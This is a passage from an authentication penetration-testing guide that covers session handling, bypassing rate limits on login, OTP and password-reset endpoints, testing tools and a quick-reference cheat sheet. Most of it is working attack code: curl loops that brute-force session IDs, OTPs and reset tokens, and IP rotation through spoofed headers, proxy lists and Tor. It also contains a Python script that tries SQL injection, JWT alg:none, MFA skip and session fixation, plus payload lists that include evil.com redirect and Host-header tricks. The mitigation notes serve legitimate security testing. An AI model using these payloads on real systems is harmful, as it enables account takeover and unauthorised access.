for i in $(seq 1000 9999); do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    -X GET "https://target.com/account" \
    -b "session=$i")
  if [ "$response" != "302" ] && [ "$response" != "401" ]; then
    echo "Valid session found: $i"
  fi
done
```

**Mitigation:** Use cryptographically secure random session IDs (>=128 bits). Use `random_bytes(32)` or `secrets.token_hex(32)`.

---

### 7.3 Concurrent Session Flaws

**Root Cause:** No limit on concurrent sessions, or sessions are not properly restricted, allowing session sharing or brute-force access.

**Testing Steps:**

1. Log in from Browser A, capture session.
2. Log in from Browser B (same credentials), capture session.
3. Both sessions work simultaneously.
4. Check if there is any limit.

```
curl -X POST "https://target.com/login" \
  -d "username=victim&password=pass" \
  -c cookies1.txt

curl -X POST "https://target.com/login" \
  -d "username=victim&password=pass" \
  -c cookies2.txt

curl -X GET "https://target.com/account" -b cookies1.txt
curl -X GET "https://target.com/account" -b cookies2.txt
```

**Security Implications:**
- Shared accounts — less severe
- If an attacker steals a session, victim remains logged in (stealth)
- Session not invalidated when credentials are changed

**curl — Test session invalidation on password change:**
```
curl -X POST "https://target.com/login" \
  -d "username=victim&password=pass" \
  -c cookies.txt

curl -X POST "https://target.com/account/password/change" \
  -b cookies.txt \
  -d "new_password=newpass"

curl -X GET "https://target.com/account" -b cookies.txt
```

**Mitigation:** Limit concurrent sessions (e.g., maximum 5). Invalidate all other sessions on password change. Show active sessions in user security settings.

---

### 7.4 Session Invalidation on Logout

**Root Cause:** The session is not destroyed on the server side when the user logs out, allowing token reuse.

**Testing Steps:**

1. Log in, capture session token.
2. Log out through the application's logout mechanism.
3. Immediately try to use the same session token to access authenticated resources.
4. If the request succeeds, the session was not invalidated.

```
curl -X POST "https://target.com/login" \
  -d "username=victim&password=pass" \
  -c cookies.txt

curl -X POST "https://target.com/logout" -b cookies.txt

curl -X GET "https://target.com/account" -b cookies.txt
```

**API Token Invalidation:**
```
curl -X POST "https://target.com/api/logout" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9..."

curl -X GET "https://target.com/api/account" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9..."
```

**Mitigation:** Invalidate the session server-side on logout. For JWT, use a token blocklist (Redis) or short-lived tokens with refresh token rotation. Delete the session from the session store.

---

### 7.5 Session Timeout Misconfiguration

**Root Cause:** Sessions have no expiration or excessively long timeouts, increasing the window for session hijacking.

**Testing Steps:**

1. Log in and capture session token.
2. Check the session cookie's `Max-Age` or `Expires` attribute.
3. If `Max-Age` is set to days/months/years, it is vulnerable.
4. Leave the session idle for the idle timeout period, then try using it.

```
curl -s -I -X POST "https://target.com/login" \
  -d "username=victim&password=pass" \
  | findstr /i "Set-Cookie"
```

**Idle Timeout Testing:**
```
curl -X POST "https://target.com/login" \
  -d "username=victim&password=pass" \
  -c cookies.txt

Start-Sleep -Seconds 1800

curl -X GET "https://target.com/account" -b cookies.txt
```

**Mitigation:** Set reasonable session timeouts: 15-30 minutes idle timeout, 8-12 hours absolute timeout for web apps. Implement sliding expiration with a hard cap.

---

### 7.6 Weak Session Cookie Attributes

**Root Cause:** Session cookies lack security attributes: HttpOnly, Secure, SameSite, Path, Domain restrictions.

**Testing Steps:**

1. Log in and examine the `Set-Cookie` headers.
2. Check for missing security attributes.
3. Test exploitation scenarios.

```
curl -s -I -v -X POST "https://target.com/login" \
  -d "username=victim&password=pass" 2>&1 | findstr /i "Set-Cookie"
```

**Cookie Analysis:**
```
# Secure cookie — ideal
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Domain=target.com

# Insecure cookie — multiple flaws
Set-Cookie: session=abc123; Path=/
# Missing: HttpOnly, Secure, SameSite
```

| Missing Attribute | Risk |
|-------------------|------|
| No HttpOnly | XSS can steal the cookie via document.cookie |
| No Secure | Cookie sent over HTTP (MITM theft) |
| No SameSite | Vulnerable to cross-site request forgery (CSRF) |
| No Path restriction | Cookie sent to unintended paths |
| Domain=target.com | Cookie sent to all subdomains |

**Mitigation:** Always set: `HttpOnly; Secure; SameSite=Lax` (or `Strict`). Restrict `Path` to the minimum. Avoid wildcard `Domain` attributes. Use `__Host-` prefix for session cookies.

---

### 7.7 Session Token in URL

**Root Cause:** Session tokens are transmitted in URL parameters (GET requests) instead of cookies or headers.

**Testing Steps:**

1. Look for session parameters in URL: `sessionid`, `token`, `jwt`, `sid`, `session_token`, `auth`.
2. Check if login redirects include the token in the URL.
3. Check if any page links include the token.

```
curl -v -X POST "https://target.com/login" \
  -d "username=victim&password=pass" 2>&1 | findstr /i "location"
```

**Vulnerable response:**
```
Location: /dashboard?token=eyJhbGciOiJIUzI1NiJ9...
```

**Mitigation:** Never transmit session tokens in URLs. Use HttpOnly cookies or Authorization headers.

---

## 8. Rate Limit Testing on Auth Endpoints

### 8.1 Login Rate Limiting Bypass

**Root Cause:** Rate limits on login endpoints are absent, per-IP only, or easily bypassed.

**Testing Steps:**

1. Send multiple rapid login requests with incorrect credentials.
2. Check if rate limiting kicks in (429 Too Many Requests, 423 Locked, account lockout).
3. Bypass per-IP rate limits: rotate IP addresses, use X-Forwarded-For headers, or use different endpoints.

**curl — Basic Rate Limit Test:**
```
for i in $(seq 1 100); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/login" \
    -d "username=victim&password=wrong$i"
done
echo ""
```

**Expected Secure Response:**
```
200 200 200 401 401 401 401 429 429 429 429 ...
```

**Vulnerable Response:**
```
401 401 401 401 401 401 401 ... (no 429, unlimited attempts)
```

**8.1.1 — X-Forwarded-For Bypass**
```
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/login" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "username=admin&password=wrong"
done
echo ""
```

**Alternative Headers:**
```
X-Forwarded-For: 10.0.0.1
X-Real-IP: 10.0.0.1
X-Forwarded-Host: 10.0.0.1
X-Client-IP: 10.0.0.1
CF-Connecting-IP: 10.0.0.1
True-Client-IP: 10.0.0.1
X-Originating-IP: 10.0.0.1
```

**8.1.2 — Endpoint Rotation Bypass**
```
for endpoint in login api/login v1/login v2/login auth signin authenticate; do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/$endpoint" \
    -d "username=admin&password=guess"
done
```

**8.1.3 — Content-Type Rotation Bypass**
```
curl -X POST "https://target.com/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"guess"}'

curl -X POST "https://target.com/login" \
  -H "Content-Type: application/xml" \
  -d '<login><username>admin</username><password>guess</password></login>'

curl -X POST "https://target.com/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=guess"
```

**8.1.4 — HTTP Verb Bypass**
```
curl -X GET "https://target.com/login?username=admin&password=guess"
curl -X HEAD "https://target.com/login?username=admin&password=guess"
curl -X OPTIONS "https://target.com/login?username=admin&password=guess"
```

**8.1.5 — Parameter Pollution Bypass**
```
curl -X POST "https://target.com/login" \
  -d "username=admin&password=guess&username=user2&password=wrong"
```

**8.1.6 — Distributed Brute Force**
```
for ip in $(cat proxy_list.txt); do
  curl -x "http://$ip:8080" -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/login" \
    -d "username=admin&password=guess"
done
```

**Mitigation:** Rate limit per user account, not per IP. Use sliding window rate limiting (e.g., 5 attempts per 15 minutes). Implement CAPTCHA after 3 failed attempts. Implement account lockout after 10 failed attempts. Log and alert on distributed brute force patterns.

---

### 8.2 OTP / Lockout Rate Limiting Bypass

**Root Cause:** Similar to login rate limiting, OTP verification and account lockout mechanisms can be bypassed.

**Testing Steps:**

1. Trigger OTP sending (SMS/email).
2. Attempt multiple OTP codes rapidly.
3. Check if rate limiting applies to OTP verification.
4. Check if lockout is enforced after N failed OTP attempts.

```
for i in $(seq -w 000000 000050); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/mfa/verify" \
    -b "session=partial_session" \
    -d "code=$i"
done
echo ""
```

**OTP Resend Bypass:**
```
curl -X POST "https://target.com/mfa/send" -d "method=sms"
curl -X POST "https://target.com/mfa/send" -d "method=email"
curl -X POST "https://target.com/mfa/resend" -d "method=sms"
```

**Mitigation:** Rate-limit OTP sending per user (max 5 per hour). Rate-limit OTP verification (max 5 attempts per 15 minutes). Implement CAPTCHA for OTP sending. Lock account after N failed OTP attempts.

---

### 8.3 Password Reset Rate Limiting Bypass

**Root Cause:** Password reset endpoints lack rate limiting, allowing mass email sending (DoS, cost for provider) or brute-force of reset tokens.

**Testing Steps:**

1. Send multiple password reset requests for the same user.
2. Check if rate limiting applies.
3. Check if the reset token verification endpoint is rate-limited.

```
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/password/reset" \
    -d "email=victim@target.com"
done
echo ""
```

**Token Verification Rate Limit Test:**
```
for i in $(seq 1 10000); do
  RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST "https://target.com/password/reset/confirm" \
    -d "token=$i&new_password=Test123!")
  if [ "$RESPONSE" != "429" ] && [ "$RESPONSE" != "401" ] && [ "$RESPONSE" != "400" ]; then
    echo "Valid token: $i (HTTP $RESPONSE)"
  fi
done
```

**Mitigation:** Rate-limit password reset requests per user (e.g., 3 per hour). Rate-limit token verification attempts (e.g., 10 per IP per 15 minutes). Use CAPTCHA after 3 reset requests.

---

### 8.4 IP Rotation / Distributed Bypass

**Root Cause:** Rate limits are applied per-IP address, allowing an attacker to bypass by rotating IPs.

**Testing Tools and Methods:**

1. Proxy Lists: Use rotating proxies (residential proxies, datacenter proxies).
2. VPN Rotation: Use VPN with rotating exit nodes.
3. Tor: Use Tor network with new circuits.
4. IPv6: Use IPv6 with rotating addresses (SLAAC privacy extensions).
5. Cloud Functions: Distribute requests across cloud functions.

**Tor-based IP Rotation:**
```
for i in $(seq 1 10); do
  echo -e "AUTHENTICATE \"\"\r\nSIGNAL NEWNYM\r\n" | nc -w 1 127.0.0.1 9051
  torsocks curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/login" \
    -d "username=admin&password=guess"
done
```

**Mitigation:** Rate-limit per user account, not per IP. Use behavioral analysis (velocity, unusual locations, unusual user agents). Implement CAPTCHA. Use risk-based authentication.

---

### 8.5 Header-Based Rate Limit Bypass

**Root Cause:** Rate limiting depends on trust of client-supplied headers like `X-Forwarded-For`, `User-Agent`, `Accept-Language`.

**Testing Steps:**

```
for i in $(seq 1 5); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/login" \
    -H "User-Agent: Mozilla/5.0 (Bot$i)" \
    -d "username=admin&password=guess"
done
echo ""

for i in $(seq 1 5); do
  curl -s -o /dev/null -w "%{http_code} " \
    -X POST "https://target.com/login" \
    -H "Accept-Language: en-US,en;q=0.$i" \
    -d "username=admin&password=guess"
done
```

**Mitigation:** Do not use client-controlled values for rate limiting. Rate limit by user account and server-detected IP.

---

### 8.6 Rate Limit Scoping Flaws

**Root Cause:** Rate limits apply to specific endpoints but not to all authentication-related functionality.

**Testing Steps:**

1. Map all authentication-related endpoints.
2. Test rate limiting on each.
3. Find the endpoint(s) without rate limiting.

```
endpoints=(
  "login"  "api/login"  "api/v1/login"  "api/v2/login"
  "auth"  "api/auth"  "authenticate"
  "signin"  "sign-in"  "api/signin"
  "user/login"  "account/login"
  "sessions"  "api/sessions"
  "token"  "api/token"
  "oauth/token"  "oauth/authorize"
  "mfa/verify"  "2fa/verify"  "api/mfa/verify"
  "password/reset"  "api/password/reset"
)

for endpoint in "${endpoints[@]}"; do
  for i in $(seq 1 5); do
    code=$(curl -s -o /dev/null -w "%{http_code}" \
      "https://target.com/$endpoint" \
      -d "username=admin&password=guess")
    if [ "$code" != "429" ]; then
      echo "$endpoint: HTTP $code (no rate limit?)"
      break
    fi
  done
done
```

**Mitigation:** Apply consistent rate limiting across ALL authentication endpoints. Use a centralized rate limiting middleware.

---

## 9. Tooling and Automation

### JWT Tools

```
# jwt_tool — comprehensive JWT testing
python3 jwt_tool.py <token> -T       # Tamper with claims
python3 jwt_tool.py <token> -X a     # alg:none attack
python3 jwt_tool.py <token> -X k     # kid injection
python3 jwt_tool.py <token> -X i     # JWK injection
python3 jwt_tool.py <token> -X j     # JKU injection
python3 jwt_tool.py <token> -C -d wordlist.txt  # Crack HMAC secret

# jwt-cracker
jwt-cracker <token> <wordlist>

# john-the-ripper (JWT mode)
john --format=jwt <token_file> --wordlist=rockyou.txt
```

### SAML Tools

```
# SAML Raider (Burp Suite Extension)
- Intercept SAML messages
- Modify assertions
- Test XSW1-XSW8
- Test signature stripping

# samlmagic
python samlmagic.py -i saml_response.xml -a admin -r admin
```

### Rate Limiting Tools

```
# ffuf — fuzzing with rate limiting bypass
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=guess" \
  -H "X-Forwarded-For: FUZZ" \
  -u https://target.com/login -mode clusterbomb
```

### General Testing Script

```python
import requests, base64, json, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "https://target.com"

def test_login_bypass():
    payloads = [
        "' OR '1'='1' --", "' OR 1=1 --",
        '{"$gt": ""}', '{"$ne": ""}',
    ]
    for payload in payloads:
        r = requests.post(f"{BASE}/login",
            data={"username": payload, "password": "x"})
        if r.status_code == 302 or "dashboard" in r.text.lower():
            print(f"Login bypass with: {payload}")

def test_jwt_none():
    h = base64.urlsafe_b64encode(
        json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=")
    p = base64.urlsafe_b64encode(
        json.dumps({"sub":"admin","admin":True}).encode()).rstrip(b"=")
    token = f"{h.decode()}.{p.decode()}."
    r = requests.get(f"{BASE}/api/admin",
        headers={"Authorization": f"Bearer {token}"})
    if r.status_code == 200:
        print(f"JWT alg:none works!")

def test_mfa_skip():
    s = requests.Session()
    s.post(f"{BASE}/login", data={"username": "test", "password": "test"})
    r = s.get(f"{BASE}/dashboard")
    if r.status_code == 200:
        print("MFA step-skip possible!")

def test_session_fixation():
    r = requests.get(BASE)
    fixed = r.cookies.get("session")
    s = requests.Session()
    s.cookies.set("session", fixed)
    s.post(f"{BASE}/login", data={"username": "test", "password": "test"})
    r = s.get(f"{BASE}/account")
    if r.status_code == 200:
        print(f"Session fixation possible! Session: {fixed}")

test_login_bypass()
test_jwt_none()
test_mfa_skip()
test_session_fixation()
```

---

## 10. Cheat Sheet: Quick Reference

### Login Bypass
```
SQLi:       ' OR '1'='1' --         (" OR 1=1 --)
NoSQLi:     {"$gt": ""}             (username[$gt]=)
Pollution:  username=admin&username=wrong  (last wins?)
MassAssign: {"is_admin":true}       {"role":"admin"}
LDAP:       *)(uid=*))(|(uid=*      (*)(password=*)
Verb:       GET /admin?action=delete (instead of POST)
Defaults:   admin:admin             root:root
```

### JWT Attacks
```
alg:none:   eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
Weak HMAC:  hashcat -m 16500 token.txt rockyou.txt
Kid inj:    {"kid":"../../dev/null"}  (sign with "")
JWK inj:    Embed your own RSA key in header
RS->HS:      Use public key as HMAC secret
```

### OAuth 2.0
```
redirect_uri bypass:  https://target.com.evil.com/callback
State CSRF:           Pre-generate state, send to victim
Code intercept:       Check HTTP vs HTTPS, referer leakage
Client secret:        Check APK/JS bundle for client_secret
PKCE downgrade:       Remove code_challenge parameter
```

### SAML
```
XSW1:       Duplicate assertion after signed one
Comment:    user@target.com<!--evil-->@attacker.com
Strip:      Remove <ds:Signature> entirely
Replay:     Submit same SAMLResponse twice
IdP conf:   Register own IdP, sign assertion
```

### MFA Bypass
```
Not enforced:  Change password without MFA step-up
Step skip:     Navigate to /dashboard after password only
Replay:        Use same OTP code twice
Brute:         Loop through 000000-999999 OTPs (if no rate limit)
Race:          Send 20 concurrent OTP verifications
Recovery:      GET /api/me (check for recovery codes)
Downgrade:     Switch from TOTP to SMS
```

### Password Reset
```
Host inj:     Change Host header to evil.com
Predictable:  Token is timestamp/sequential/userhash
Referer leak: Reset page loads external resource
Race:         Concurrent reset with same token
Reuse:        Use same token after successful reset
Enumeration:  Check response for "user not found"
```

### Session
```
Fixation:     Pre-set session ID, victim logs in
Prediction:   Sequential/timestamp sessions
Concurrent:   No limit on active sessions
Logout:       Session still works after logout
Timeout:      No idle/absolute timeout
Cookie:       Missing HttpOnly, Secure, SameSite
URL token:    Token in GET parameter (?session=abc)
```

### Rate Limit
```
X-Forwarded-For:   Rotate IPs via header
Endpoint rotate:   /login, /api/login, /v1/login
Content type:      JSON, XML, form-urlencoded
User-Agent:        Rotate User-Agent per request
Distributed:       Multiple IPs via proxy list
```

---

*End of Authentication Testing Rules*
